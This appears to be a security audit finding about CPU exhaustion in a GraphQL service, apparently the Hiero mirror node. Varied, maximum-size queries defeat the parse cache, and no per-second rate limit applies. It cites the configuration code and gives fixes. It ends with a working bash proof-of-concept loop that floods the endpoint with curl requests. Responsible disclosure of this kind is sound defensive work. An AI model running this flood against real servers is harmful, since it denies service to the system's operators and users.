### Title
GraphQL Parser Exhaustion via Maximum-Size Unique Queries with No Per-Request Rate Limit

### Summary
The GraphQL endpoint enforces parser limits (`maxCharacters(10000)`, `maxTokens(1000)`) that are checked during ANTLR parsing, meaning the parser must perform full character-scanning and token-counting work before any limit is enforced. The preparsed document cache is keyed on the exact query string, so an attacker sending slightly varied queries (e.g., incrementing a comment or alias) bypasses the cache entirely. Unlike the web3 module, the GraphQL service has no per-second request rate limit — only a concurrency cap of 5 in-flight requests per IP — allowing a single unprivileged user to sustain continuous maximum-cost parse operations.

### Finding Description

**Exact code location:**

`graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java`, lines 31–39 (static initializer):

```java
Consumer<Builder> consumer =
    b -> b.maxCharacters(10000).maxRuleDepth(100).maxTokens(1000).maxWhitespaceTokens(1000);
ParserOptions.setDefaultParserOptions(...transform(consumer));
ParserOptions.setDefaultOperationParserOptions(...transform(consumer));
``` [1](#0-0) 

**Root cause — limits are enforced inside the parser, not before it:**
The `maxCharacters` and `maxTokens` checks are performed by the ANTLR-based graphql-java lexer/parser as it processes the input. The parser must scan every character and count every token up to the configured ceiling before it can throw a `LimitExceededError`. A query at exactly 10,000 characters with ~1,000 tokens forces the maximum possible scanning and token-counting work per invocation.

**Cache bypass:**
`CachedPreparsedDocumentProvider` keys the cache on the raw query string:

```java
return cache.get(executionInput.getQuery(), key -> parseAndValidateFunction.apply(executionInput));
``` [2](#0-1) 

The cache holds at most 1,000 entries and expires after 1 hour: [3](#0-2) 

Any single-character variation in the query string (e.g., appending `# 1`, `# 2`, … as comments, or cycling field aliases) produces a cache miss and triggers a full parse+validate cycle.

**No per-second rate limit for GraphQL:**
The only network-level throttle is a Traefik `inFlightReq` middleware capping concurrent requests at 5 per source IP:

```yaml
- inFlightReq:
    amount: 5
    sourceCriterion:
      ipStrategy:
        depth: 1
``` [4](#0-3) 

This is a **concurrency** cap, not a **throughput** cap. There is no `requestsPerSecond` bucket or equivalent for the GraphQL service (contrast with the web3 module's `requestsPerSecond: 500` bucket4j throttle). A single IP can continuously cycle through 5 concurrent connections, each completing a max-size parse as fast as the server can process it, with no per-second ceiling.

**Complexity/depth instrumentation does not help:**
`MaxQueryComplexityInstrumentation(200)` and `MaxQueryDepthInstrumentation(10)` run post-parse, after the full parsing cost has already been paid. [5](#0-4) 

### Impact Explanation
The server is configured with a 2-core CPU limit. With 5 concurrent max-size parse operations running continuously (no per-second rate limit), and each ANTLR parse of a 10,000-character / 1,000-token query consuming measurable CPU cycles, a single attacker can sustain a CPU load that, against a lightly-to-moderately loaded baseline, exceeds the 30% increase threshold. Multiple source IPs (even just 2–3) multiply the effect linearly. The attack does not require authentication, special headers, or knowledge of the schema beyond the public `/graphql/alpha` endpoint.

### Likelihood Explanation
The attack requires no privileges, no account, and no special tooling — only the ability to send HTTP POST requests to the public GraphQL endpoint. Crafting a 10,000-character query with ~1,000 tokens is trivial (e.g., a deeply aliased query with many repeated fields padded to the character limit). Varying a trailing comment (`# N`) on each request is a one-line loop. The attack is fully repeatable and automatable. The `inFlightReq: 5` cap means a single IP is bounded, but the absence of a per-second rate limit means the attacker can sustain maximum throughput indefinitely within that concurrency window.

### Recommendation
1. **Add a per-second request rate limit to the GraphQL service**, analogous to the web3 module's `requestsPerSecond` bucket4j throttle. A value of 50–100 RPS per IP is a reasonable starting point.
2. **Enforce a pre-parse character length check** at the HTTP/controller layer (before the ANTLR parser is invoked) so oversized bodies are rejected with zero parsing cost.
3. **Consider reducing `maxCharacters`** — 10,000 characters is generous for the current schema; profiling legitimate queries to set a tighter bound reduces the worst-case parse cost.
4. **Add a rate-limit middleware** (e.g., Traefik `rateLimit`) in addition to `inFlightReq` to cap requests-per-second per IP, not just concurrency.

### Proof of Concept

```bash
# Build a ~10,000-char query with high token density (repeated aliased fields)
# Vary the comment on each request to defeat the preparsed cache

BASE_QUERY='{ account(input:{entityId:{shard:0,realm:0,num:1}}) { alias balance createdTimestamp declineReward deleted ethereumNonce evmAddress expirationTimestamp key { _type key } maxAutomaticTokenAssociations memo pendingReward receiverSigRequired stakedAccountId stakedNodeId stakePeriodStart } }'
# Pad to ~10000 chars with a comment
PADDING=$(python3 -c "print('#' + 'A'*9800)")

for i in $(seq 1 10000); do
  QUERY="${BASE_QUERY} # ${i} ${PADDING}"
  curl -s -X POST https://<host>/graphql/alpha \
    -H 'Content-Type: application/json' \
    -d "{\"query\": \"${QUERY}\"}" &
  # Keep 5 in-flight at a time
  if (( i % 5 == 0 )); then wait; fi
done
```

Each iteration sends a unique query string (cache miss), forcing a full ANTLR parse of ~10,000 characters and ~1,000 tokens. Monitor `process_cpu_usage{application="graphql"}` via Prometheus; expect sustained elevation above the 24-hour baseline.

### Citations

**File:** graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java (L31-39)
```java
    static {
        // Configure GraphQL parsing limits to reject malicious input
        Consumer<Builder> consumer =
                b -> b.maxCharacters(10000).maxRuleDepth(100).maxTokens(1000).maxWhitespaceTokens(1000);
        ParserOptions.setDefaultParserOptions(
                ParserOptions.getDefaultParserOptions().transform(consumer));
        ParserOptions.setDefaultOperationParserOptions(
                ParserOptions.getDefaultOperationParserOptions().transform(consumer));
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java (L43-45)
```java
        var maxQueryComplexity = new MaxQueryComplexityInstrumentation(200);
        var maxQueryDepth = new MaxQueryDepthInstrumentation(10);
        var instrumentation = new ChainedInstrumentation(maxQueryComplexity, maxQueryDepth);
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/cache/CachedPreparsedDocumentProvider.java (L26-26)
```java
        return cache.get(executionInput.getQuery(), key -> parseAndValidateFunction.apply(executionInput));
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/cache/CacheProperties.java (L15-15)
```java
    private String query = "expireAfterWrite=1h,maximumSize=1000,recordStats";
```

**File:** charts/hedera-mirror-graphql/values.yaml (L138-142)
```yaml
  - inFlightReq:
      amount: 5
      sourceCriterion:
        ipStrategy:
          depth: 1
```
